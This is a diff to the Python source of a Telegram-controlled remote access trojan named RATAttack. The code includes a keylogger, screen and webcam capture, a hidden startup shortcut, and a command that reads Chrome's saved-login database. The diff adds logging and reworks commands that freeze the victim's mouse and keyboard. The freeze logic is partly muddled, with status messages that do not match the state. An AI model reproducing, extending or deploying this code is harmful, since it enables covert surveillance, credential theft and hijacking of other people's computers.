@@ -3,6 +3,7 @@
 import os, os.path, platform, ctypes
 os.environ["PBR_VERSION"]='5.0.0'
 import logging
+from consoleTools import consoleDisplay as cd
 from PIL import ImageGrab 								# /capture_pc
 from shutil import copyfile, copyfileobj, rmtree, move 	# /ls, /pwd, /cd, /copy, /mv
 from sys import argv, path, stdout 						# console output
@@ -26,18 +27,19 @@ import proxy
 import telepot, requests 								# telepot => telegram, requests => file download
 from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
 import pyHook, pythoncom 								# keylogger
-import socket											# internal IP
+import socket									# internal IP
 import getpass											# get username
 import collections
 import urllib# wallpaper
 import cv2#webcam
 from ctypes import * #fixing pyinstaller - we need to import all the ctypes to get api-ms-win-crt-*, you will also need https://www.microsoft.com/en-US/download/details.aspx?id=48145
 
+cd.log('i','Starting',True)
 me = singleton.SingleInstance()
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
-token = 'xx:xx' # you can set your environment variable as well
+token = 'xx:xx'
 # This will be used for setting paths and related file io -- change to whatever you want
-app_name = 'xx'
+app_name = 'ABCdef123'
 # ADD YOUR chat_id in string format TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
 known_ids = []
 #known_ids.append(os.environ['TELEGRAM_CHAT_ID']if 'TELEGRAM_CHAT_ID' in os.environ) 		# make sure to remove this line if you don't have this environment variable
@@ -57,6 +59,8 @@ if not os.path.exists(hide_folder):
 	shortcut.Targetpath = hide_compiled
 	shortcut.WorkingDirectory = hide_folder
 	shortcut.save()
+
+global mouseFrozen
 destroy = False
 keyboardFrozen = False
 mouseFrozen = False
@@ -125,7 +129,13 @@ def get_curr_window():
 		kernel32.CloseHandle(hwnd)
 		kernel32.CloseHandle(h_process)
 		return pid_info
-	
+
+def false_event(event):
+        return False
+
+def true_event(event):
+        return True
+
 def pressed_chars(event):
 	data = None
 	global curr_window
@@ -162,7 +172,7 @@ def split_string(n, st):
 def send_safe_message(bot, chat_id, message):
 	while(True):
 		try:
-			print(bot.sendMessage(chat_id, message))
+			cd.log('n','Message sent:\n{}'.format(bot.sendMessage(chat_id, message)),True)
 			break
 		except:
 			pass
@@ -172,7 +182,7 @@ def handle(msg):
         if checkchat_id(chat_id):
                 response = ''
                 if 'text' in msg:
-                        print('\n\t\tGot message from ' + str(chat_id) + ': ' + msg['text'] + '\n\n')
+                        cd.log('n','\n\t\tGot message from ' + str(chat_id) + ': ' + msg['text'] + '\n\n',True)
                         command = msg['text']
                         if command == '/arp':
                                 response = ''
@@ -293,15 +303,31 @@ def handle(msg):
                                 else:
                                         response += 'enabled'
                         elif command.endswith('freeze_mouse'):
-                                global mouseFrozen
-                                mouseFrozen = not command.startswith('/un')
-                                hookManager.MouseAll = lambda event: not mouseFrozen
-                                hookManager.HookMouse()
-                                response = 'Mouse is now '
-                                if mouseFrozen:
-                                        response += 'disabled. To enable, use /unfreeze_mouse'
+                                if mouseFrozen == False:                                                   
+                                        mse = pyHook.HookManager()
+                                        mse.MouseAll = false_event
+                                        mse.KeyAll = false_event
+                                        mse.HookMouse()
+                                        mse.HookKeyboard()
+                                        pythoncom.PumpMessages()
+                                        response += 'enabled. To disable use /unfreeze_mouse'
+                                elif mouseFrozen == True:
+                                        response += 'enabled. To disable, use /unfreeze_mouse'
                                 else:
-                                        response += 'enabled'
+                                        response += 'The script has commited the act of death'
+                        elif command.endswith('unfreeze_mouse'):
+                                if mouseFrozen == True:                                                   
+                                        mse = pyHook.HookManager()
+                                        mse.MouseAll = true_event
+                                        mse.KeyAll = true_event
+                                        mse.HookMouse()
+                                        mse.HookKeyboard()
+                                        pythoncom.PumpMessages()
+                                        response += 'disabled. To enable use /freeze_mouse'
+                                elif mouseFrozen == False:
+                                        response += 'already disabled. To enable, use /freeze_mouse'
+                                else:
+                                        response += 'The script has commited the act of death'
                         elif command == '/get_chrome':
                                 con = sqlite3.connect(os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data')
                                 cursor = con.cursor()
@@ -593,14 +619,17 @@ def handle(msg):
                         responses = split_string(4096, response)
                         for resp in responses:
                                 send_safe_message(bot, chat_id, resp)#
-if token == 'xx:xx': raise Exception('Token not set')
+if token == 'xx:xx': cd.log('e','Token has not been set, open up RATAttack.py and change the token - then recompile (if applicable).',True); raise Exception('Token not set')
+cd.log('s','Setup done',True)
+cd.log('i','Starting',True)
 bot = telepot.Bot(token)
 bot.message_loop(handle)
 if len(known_ids) > 0:
 	helloWorld = platform.uname()[1] + ": I'm up."
 	for known_id in known_ids: send_safe_message(bot, known_id, helloWorld)
 	print(helloWorld)
-print('Listening for commands on ' + platform.uname()[1] + '...')
+cd.log('s','Started',True)
+cd.log('i','Listening for commands on ' + platform.uname()[1] + '...',True)
 hookManager = pyHook.HookManager()
 hookManager.KeyDown = pressed_chars
 hookManager.HookKeyboard()
